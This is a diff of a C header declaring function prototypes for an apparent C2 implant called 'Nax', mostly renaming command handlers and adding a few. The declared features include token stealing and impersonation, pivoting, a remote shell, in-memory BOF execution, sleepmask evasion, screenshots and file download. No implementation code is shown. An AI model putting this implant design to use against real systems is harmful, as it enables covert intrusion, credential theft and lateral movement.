@@ -78,28 +78,26 @@ FUNC UINT16 NaxR16( const PBYTE p );
 FUNC UINT32 NaxR32( const PBYTE p );
 FUNC INT    NaxFrameEncode( BYTE msg_type, const PBYTE payload, UINT32 payload_len, PBYTE out, UINT32* out_len );
 FUNC INT    NaxFrameDecode( const PBYTE frame, UINT32 frame_len, BYTE* msg_type, PBYTE* payload, UINT32* payload_len );
-FUNC INT    NaxBuildRegBody( const PCHAR hn, UINT32 hn_len, const PCHAR un, UINT32 un_len, BYTE os_type,
-                             UINT32 os_ver, UINT32 pid, UINT32 tid,
-                             const PCHAR proc, UINT32 proc_len, const PCHAR ip, UINT32 ip_len,
-                             const PCHAR domain, UINT32 domain_len,
-                             BYTE is_admin, UINT32 os_build, UINT32 os_arch, UINT16 acp, UINT32 oem_cp, UINT32 sleep_ms, UINT32 jitter,
-                             const PCHAR img_path, UINT32 img_path_len,
-                             PBYTE out, UINT32* out_len );
+FUNC INT    NaxBuildRegBody( PNAX_INSTANCE Nax, PNAX_SYSINFO info, PBYTE out, UINT32* out_len );
 FUNC INT    NaxBuildHeartbeat( PBYTE out, UINT32* out_len );
 FUNC INT    NaxDecodeTask( const PBYTE body, UINT32 body_len, NAX_TASK* t );
 FUNC INT    NaxBuildResult( UINT32 task_id, BYTE status, const PBYTE data, UINT32 data_len, PBYTE out, UINT32* out_len );
 
 /* ========= [ Commands/Dispatch.c ] ========= */
 
-FUNC INT NaxDispatch( PNAX_INSTANCE Nax, const NAX_TASK* task,
-                      UINT32* result_task_id, BYTE* result_status,
-                      PBYTE result_data, UINT32* result_data_len );
+FUNC VOID NaxDispatchInit( PNAX_INSTANCE Nax );
+FUNC INT  NaxDispatch( PNAX_INSTANCE Nax, const NAX_TASK* task, UINT32* result_task_id, BYTE* result_status, PBYTE result_data, UINT32* result_data_len );
 
 /* ========= [ Commands/Sleepmask.c - BeaconGate ] ========= */
 
 FUNC INT  NaxSleepmaskInit( PNAX_INSTANCE Nax );
 FUNC INT  NaxSleepmaskWire( PNAX_INSTANCE Nax, PBYTE coff, UINT32 coff_size );
 FUNC VOID NaxGateUnwireAll( PNAX_INSTANCE Nax );
+
+/* ========= [ Commands/Token.c ] ========= */
+
+FUNC BOOL NaxTokenResolveUser( PNAX_INSTANCE Nax, HANDLE hToken, PCHAR user, DWORD* userLen, PCHAR domain, DWORD* domainLen, BOOL* elevated );
+FUNC BOOL NaxTokenApply( PNAX_INSTANCE Nax, HANDLE hToken );
 
 /* ========= [ Commands/Pivot.c ] ========= */
 
@@ -108,11 +106,14 @@ FUNC VOID   NaxPostPivotHeaderRead( PNAX_INSTANCE Nax, NAX_PIVOT* p );
 
 /* ========= [ Commands/Jobs.c ] ========= */
 
-FUNC UINT32    NaxProcessJobs( PNAX_INSTANCE Nax, PBYTE out, UINT32 out_cap );
+FUNC VOID           NaxBofFreeMedia( PNAX_INSTANCE Nax, NAX_BOF_MEDIA* head );
+FUNC NAX_BOF_MEDIA* NaxBofReverseMedia( NAX_BOF_MEDIA* head );
+FUNC UINT32         NaxProcessJobs( PNAX_INSTANCE Nax, PBYTE out, UINT32 out_cap );
 FUNC NAX_JOB*  NaxJobCreate( PNAX_INSTANCE Nax, UINT32 taskId, PBYTE coffBuf, UINT32 coffSize, PBYTE argsBuf, UINT32 argsSize, DWORD timeoutMs );
 FUNC INT       NaxJobStart( PNAX_INSTANCE Nax, NAX_JOB* job );
-FUNC INT       NaxJobList( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len );
+FUNC INT       NaxCmdJobList( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len );
 FUNC INT       NaxJobKill( PNAX_INSTANCE Nax, UINT32 taskId );
+FUNC INT       NaxCmdJobKill( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
 FUNC INT       NaxCmdWatchdogSet( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
 
 /* ========= [ Commands/Shell.c - remote shell ] ========= */
@@ -148,15 +149,16 @@ FUNC VOID   NaxBuildPathWithParams( PWCHAR path_src, PWCHAR path_out, UINT32 pat
 
 FUNC INT NaxCmdWhoami( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len );
 FUNC INT NaxCmdSleep( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
-FUNC INT CmdCd( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
-FUNC INT CmdPwd( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
-FUNC INT CmdMkdir( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
-FUNC INT CmdRmdir( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
-FUNC INT CmdCat( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
-FUNC INT CmdLs( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
-FUNC INT CmdRm( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
-FUNC INT CmdCp( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
-FUNC INT CmdMv( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
+FUNC INT NaxCmdCd( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
+FUNC INT NaxCmdPwd( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
+FUNC INT NaxCmdMkdir( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
+FUNC INT NaxCmdRmdir( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
+FUNC INT NaxCmdCat( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
+FUNC INT NaxCmdLs( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
+FUNC INT NaxCmdRm( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
+FUNC INT NaxCmdCp( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
+FUNC INT NaxCmdMv( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
+FUNC INT NaxCmdChunksize( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
 FUNC INT NaxCmdBof( PNAX_INSTANCE Nax, UINT32 taskId, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
 FUNC INT NaxCmdScreenshot( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len );
 FUNC INT NaxCmdDownload( PNAX_INSTANCE Nax, UINT32 taskId, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
@@ -168,21 +170,21 @@ FUNC VOID NaxMemSaveFree( PNAX_INSTANCE Nax, UINT32 memoryId );
 FUNC INT NaxCmdBofStomp( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
 FUNC INT NaxCmdSleepmaskSet( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
 FUNC INT NaxCmdSleepObfConfig( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
-FUNC INT CmdPsList( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
-FUNC INT CmdPsKill( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
-FUNC INT CmdPsRun( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
-FUNC INT CmdLink( PNAX_INSTANCE Nax, UINT32 taskId, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
-FUNC INT CmdUnlink( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
-FUNC INT CmdPivotExec( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
-FUNC INT CmdProfile( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
-FUNC INT CmdTokenGetUid( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len );
-FUNC INT CmdTokenSteal( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
-FUNC INT CmdTokenUse( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
-FUNC INT CmdTokenList( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len );
-FUNC INT CmdTokenRm( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
-FUNC INT CmdTokenRevert( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len );
-FUNC INT CmdTokenMake( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
-FUNC INT CmdTokenPrivs( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len );
+FUNC INT NaxCmdPsList( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
+FUNC INT NaxCmdPsKill( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
+FUNC INT NaxCmdPsRun( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
+FUNC INT NaxCmdLink( PNAX_INSTANCE Nax, UINT32 taskId, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
+FUNC INT NaxCmdUnlink( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
+FUNC INT NaxCmdPivotExec( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
+FUNC INT NaxCmdProfile( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
+FUNC INT NaxCmdTokenGetUid( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len );
+FUNC INT NaxCmdTokenSteal( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
+FUNC INT NaxCmdTokenUse( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
+FUNC INT NaxCmdTokenList( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len );
+FUNC INT NaxCmdTokenRm( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
+FUNC INT NaxCmdTokenRevert( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len );
+FUNC INT NaxCmdTokenMake( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len );
+FUNC INT NaxCmdTokenPrivs( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len );
 
 /* ========= [ Commands/DllNotify.c ] ========= */
 
